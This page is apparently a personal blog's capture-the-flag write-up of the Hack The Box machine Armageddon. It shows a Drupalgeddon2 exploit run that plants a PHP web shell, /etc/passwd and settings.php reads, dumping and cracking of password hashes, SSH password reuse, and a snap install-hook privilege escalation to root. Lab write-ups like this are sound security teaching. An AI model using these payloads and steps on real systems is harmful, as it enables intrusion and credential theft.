@@ -1,0 +1,617 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Armageddon &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Armageddon - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Armageddon">
+    <meta itemprop="description" content="Hack The Box - Armageddon - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Armageddon">
+    <meta property="og:description" content="Hack The Box - Armageddon - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/article/armageddon/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/article/armageddon/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/article/armageddon/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/" class="active">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/article/armageddon/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/article/armageddon/">
+            Hack The Box - Armageddon
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-07-25</span>
+            
+        
+
+        
+            
+                <span class="readingTime">6 min read</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/linux/">linux</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/armageddon/arma-fiche.png" alt=""></p>
+<p>Armageddon is a medium <a href="https://app.hackthebox.eu/machines/Armageddon">machine</a> that was deployed on Hack The Box on Saturday, 27 march 2021 and created by <strong>bertolis</strong>.</p>
+<h1 id="quick-summary">Quick summary</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#web-enumeration">Web enumeration</a></li>
+    <li><a href="#foothold---apache">Foothold - apache</a></li>
+    <li><a href="#lateral-movement---brucetherealadmin">Lateral movement - brucetherealadmin</a></li>
+    <li><a href="#privesc---root">PrivEsc - root</a></li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+</code></pre></div><p>There are two ports :</p>
+<ul>
+<li>a <code>22/SSH</code> service</li>
+<li>an apache <code>80/HTTP</code> service which hosts a <code>drupal CMS</code></li>
+<li>CentOS OS.</li>
+</ul>
+<p>There are also several directories and files that may be of interest :</p>
+<ul>
+<li>CHANGELOG.txt usually contains the version of the CMS</li>
+<li><code>/includes</code></li>
+<li><code>/modules</code></li>
+<li><code>/script</code></li>
+<li>robots.txt</li>
+<li>LICENCE.txt</li>
+</ul>
+<h2 id="web-enumeration">Web enumeration</h2>
+<p>When you go to the webdite, you get a classic drupal page.</p>
+<p><img src="/img/armageddon/arma-site.png" alt=""></p>
+<p>After auditing the source code, I found nothing special. The <code>CHANGELOG.txt</code> file gives us the version of the CMS.</p>
+<p><img src="/img/armageddon/arma-version.png" alt=""></p>
+<p>So we can move on to the fuzzing with the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt">directory-list-2.3-medium.txt</a> wordlist.</p>
+<pre><code>=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://armageddon.htb/
+[+] Threads      : 10
+[+] Wordlist     : /home/luks/infosec/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2021/03/28 07:55:27 Starting gobuster
+=====================================================
+/misc (Status: 301)
+/themes (Status: 301)
+/modules (Status: 301)
+/scripts (Status: 301)
+/sites (Status: 301)
+/includes (Status: 301)
+/profiles (Status: 301)
+=====================================================
+2021/03/28 08:02:48 Finished
+=====================================================
+</code></pre><p>The site is vulnerable to <code>Directory Listing</code>, When I go to <code>/sites</code>, I can display the contents of the directory in raw.</p>
+<p><img src="/img/armageddon/arma-dl.png" alt=""></p>
+<p>After investigation, I found the condiguration file under <code>/sites/default/settings.php</code></p>
+<p><img src="/img/armageddon/arma-setting.png" alt=""></p>
+<h2 id="foothold---apache">Foothold - apache</h2>
+<p>We quickly find a vulnerability on this version, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a> and an associated ruby exploit that allows a <a href="https://www.exploit-db.com/exploits/44449">RCE</a> that works and we get a first access with the <code>apache</code> user.</p>
+<pre><code>$ ruby drupal.rb http://10.10.10.233
+ruby: warning: shebang line ending with \r may cause problems
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://10.10.10.233/
+--------------------------------------------------------------------------------
+[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.56
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo PFYAFNUV
+[+] Result : PFYAFNUV
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
+armageddon.htb&gt;&gt; id &amp;&amp; date
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+</code></pre><p>You can&rsquo;t move around and the rights are very restricted. After enumeration I found the <a href="https://fr.wikipedia.org/wiki/SELinux">SELinux</a> (Security Enhanced Linux) security mecanism was installed on the machine. It significantly improves the security of the servers on which it is deployed, by providing an additional layer to the traditional Unix file access rights.</p>
+<p>I first tried to bypass it before looking for another solution.</p>
+<p>Enumerate the <code>/etc/passwd</code> users of the machine and find <code>brucetherealadmin</code>.</p>
+<pre><code>cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+</code></pre><h2 id="lateral-movement---brucetherealadmin">Lateral movement - brucetherealadmin</h2>
+<p>I&rsquo;m in the <code>/var/www/html</code> directory and we remember the <code>/sites/default/settings.php</code> configuration file from the directory listing. I display it and find the credentials <code>drupaluser:CQHEy@9M*m23gBVj</code> to connect to <code>mysql</code>.</p>
+<pre><code>armageddon.htb&gt;&gt; pwd
+/var/www/html
+armageddon.htb&gt;&gt; ls ./sites/default
+default.settings.php
+files
+settings.php
+armageddon.htb&gt;&gt; cat ./sites/default/settings.php
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#960050;background-color:#1e0010">$</span>databases <span style="color:#f92672">=</span> array (
+  <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
+  array (
+    <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
+    array (
+      <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;drupal&#39;</span>,
+      <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;drupaluser&#39;</span>,
+      <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;CQHEy@9M*m23gBVj&#39;</span>,
+      <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
+      <span style="color:#e6db74">&#39;port&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+      <span style="color:#e6db74">&#39;driver&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysql&#39;</span>,
+      <span style="color:#e6db74">&#39;prefix&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+</code></pre></div><p>You cannot connect to the DB with this user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">armageddon.htb<span style="color:#f92672">&gt;&gt;</span> mysql <span style="color:#f92672">-</span>u drupaluser <span style="color:#f92672">-</span>p CQHEy<span style="color:#f92672">@</span><span style="color:#ae81ff">9</span>M<span style="color:#f92672">*</span>m23gBVj
+Enter password: ERROR <span style="color:#ae81ff">1045</span> (<span style="color:#ae81ff">28000</span>): <span style="color:#66d9ef">Access</span> denied <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">user</span> <span style="color:#e6db74">&#39;drupaluser&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;localhost&#39;</span> (<span style="color:#66d9ef">using</span> password: <span style="color:#66d9ef">NO</span>)
+</code></pre></div><p>But you can use <code>-e</code> to run the query directly against the <code>drupal</code> DB. I start by listing the tables, there are a lot of them so I only show those that match the users.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">armageddon.htb<span style="color:#f92672">&gt;&gt;</span> mysql <span style="color:#f92672">-</span>u drupaluser <span style="color:#f92672">-</span>pCQHEy<span style="color:#f92672">@</span><span style="color:#ae81ff">9</span>M<span style="color:#f92672">*</span>m23gBVj <span style="color:#f92672">-</span>D drupal <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;show tables;&#34;</span> <span style="color:#f92672">|</span> grep <span style="color:#66d9ef">user</span>
+shortcut_set_users
+users
+users_roles
+</code></pre></div><p>The <code>users</code> table looks interesting. There are a lot of columns so I&rsquo;ll only display <code>name, pass</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">armageddon.htb<span style="color:#f92672">&gt;&gt;</span> mysql <span style="color:#f92672">-</span>u drupaluser <span style="color:#f92672">-</span>pCQHEy<span style="color:#f92672">@</span><span style="color:#ae81ff">9</span>M<span style="color:#f92672">*</span>m23gBVj <span style="color:#f92672">-</span>D drupal <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;select name,pass from users;&#34;</span>
+name	pass
+	
+brucetherealadmin	<span style="color:#960050;background-color:#1e0010">$</span>S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+bum	<span style="color:#960050;background-color:#1e0010">$</span>S$DWhnXl6sqN4btjXJT0OB49rlqq5NLuWN0Xewb7zTglYayqBHoFVz
+test	<span style="color:#960050;background-color:#1e0010">$</span>S$DEkMRrtO46.m8HUD7DTbBmauljO3G3WlY2MhEnReMVtGfKY.B1h4
+<span style="color:#66d9ef">admin</span>	<span style="color:#960050;background-color:#1e0010">$</span>S$DxthnH0a69JMSpDuYgUir.ncNG9alobtpnqF2PdHwoeadTEao<span style="color:#f92672">/</span>MZ
+</code></pre></div><p>We get the hash <code>$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</code> from <code>brucetherealadmin</code> and we crack it with john.</p>
+<pre><code>john bruce.txt 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+booboo           (?)
+1g 0:00:00:00 DONE 2/3 (2021-03-28 00:04) 1.250g/s 200.0p/s 200.0c/s 200.0C/s black..bradley
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>I can now log into the site with credentials <code>brucetherealadmin:booboo</code>.
+He has administrator rights.</p>
+<p><img src="/img/armageddon/arma-adm.png" alt=""></p>
+<p>I try reusing the password to connect in SSH and it works.
+We get the first flag <code>user.txt</code> 😊</p>
+<pre><code>$ ssh brucetherealadmin@10.10.10.233
+The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
+ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
+brucetherealadmin@10.10.10.233's password:
+Last login: Sun Mar 28 07:40:19 2021 from 10.10.14.213
+[brucetherealadmin@armageddon ~]$
+</code></pre><p><img src="/img/armageddon/arma-user.txt.png" alt=""></p>
+<h2 id="privesc---root">PrivEsc - root</h2>
+<p>By doing <code>sudo -l</code>, We can see that the <code>snap</code> binary can be run with <code>root</code> privileges.</p>
+<p><img src="/img/armageddon/arma-snap.png" alt=""></p>
+<p>After searching for a way to exploit snap, I came across this article from <code>xct</code> which shows how to install a vulnerable snap package.</p>
+<p><img src="/img/armageddon/arma-xct.png" alt=""></p>
+<p>The <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">exploit</a> does not work directly on my kali, the goal is to get the base64 encoded string that represents an installable snap package. It has a bash script in the install hook that will create a new user <code>dirty_sock</code>.</p>
+<p><img src="/img/armageddon/arma-hook.png" alt=""></p>
+<p>Then we use the command <code>sudo /usr/bin/snap install luks.snap --dangerous --devmode</code> to install the package and create the user.</p>
+<p><img src="/img/armageddon/arma-dirty.png" alt=""></p>
+<p>Finally, we use the <code>su dirty_sock</code> command to log in with the password <code>dirty_sock</code> and the command <code>sudo -i</code> to become root.
+I can get the last flag <code>root.txt</code>.</p>
+<p><img src="/img/armageddon/arma-root.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/web/">web</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/outdated-software/">outdated software</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/environment-misconfiguration/">environment misconfiguration</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/fr/article/armageddon/">fr</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Latest posts</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/advuln/">Setting up a vulnerable AD environment</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/categories/"><strong>Categories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/categories/ctf">Ctf
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/htb">Htb
+                        (21)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/write-up">Write up
+                        (18)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/linux">Linux
+                        (15)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/writeup">Writeup
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Social media</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Other languages</strong>
+                
+                
+                <a href="//luksec.fr/" class="active">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
